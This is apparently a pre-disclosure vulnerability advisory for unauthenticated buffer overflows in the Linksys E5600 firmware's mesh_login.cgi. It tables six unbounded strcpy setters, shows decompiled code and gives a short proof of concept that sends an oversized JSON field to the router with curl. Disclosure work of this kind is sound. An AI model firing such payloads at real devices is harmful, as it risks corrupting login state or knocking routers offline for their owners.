# CVE-TBD: Linksys E5600 mesh_login.cgi Multiple Global Buffer Overflows via Unbounded strcpy

## Affected Product

- Vendor: Linksys
- Product: E5600
- Firmware: v1.1.0.26
- Component: `/www/cgi-bin/mesh_login.cgi` (MIPS32 ELF binary)

## Summary

The JSON request parser of `/cgi-bin/mesh_login.cgi` copies six
attacker-controlled string fields into fixed-size **global** buffers using
unbounded `strcpy()`. Several of the destination buffers are extremely
small (6 and 16 bytes), so any over-long JSON field overwrites adjacent
global variables and everything after them in `.bss`, including a saved
copy of the JSON request object pointer. The endpoint is reachable without
authentication (it performs its own login handling).

## Vulnerability Type / CWE

- CWE-787: Out-of-bounds Write (CWE-120 classic buffer copy without size check)

## Root Cause

The parser is table-driven: each JSON key maps to a setter callback.
All six setters are bare `strcpy()` into `.bss` globals:

| JSON key | Destination | Buffer size (by address spacing) |
|----------|-------------|----------------------------------|
| username | 0x004159d4 | 130 bytes |
| password | 0x00415a56 | 130 bytes |
| token    | 0x00415ad8 | 64 bytes |
| source   | 0x00415b18 | **6 bytes** |
| cn       | 0x00415b1e | **16 bytes** |
| action   | 0x00415b2e | **16 bytes** |

Decompiled setter example:

```c
undefined4 setter_source(undefined4 a, undefined4 b, char *value)
{
  strcpy(&GLOBAL_source, value);   // 6-byte buffer, no length check
  return 0;
}
```

The enclosing state block is 362 bytes (`memset(base, 0, 0x16a)` in main);
overflowing `source` (6 B), `cn` (16 B) or `action` (16 B) spills past the
block end into subsequent `.bss` variables.

## Proof of Concept (non-destructive)

```bash
python3 -c "
import json
print(json.dumps({'action':'login','source':'A'*2000,'username':'x','password':'y'}))" > ovf.json

curl -X POST http://<ROUTER_IP>/cgi-bin/mesh_login.cgi \
  -H 'Content-Type: application/json' --data-binary @ovf.json
```

In the rehosted research environment, payloads of 500–20000 bytes were
parsed and processed without a crash in the tested code path — i.e. the
corruption lands in slack `.bss` on that build. The out-of-bounds write
itself is unconditional and statically evident; impact on production
devices depends on the exact `.bss` layout (adjacent globals include the
session-state fields used by the login logic).

## Impact

- Pre-authentication memory corruption of security-relevant global state
  (adjacent buffers hold the `source`/`action`/credential fields evaluated
  by the login routine).
- Potential for denial of service or manipulation of authentication
  decisions; control-flow hijacking was not demonstrated.

## Proposed CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` — **3.5 (Low)** (conservative,
reflecting demonstrated impact; likely higher with confirmed DoS/RCE)

## Discovery

- Date: 2026-10-10
- Method: static reverse engineering (Ghidra) + dynamic probing on rehosted firmware
- Researcher: Zimo-666

## Timeline

- 2026-10-10: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
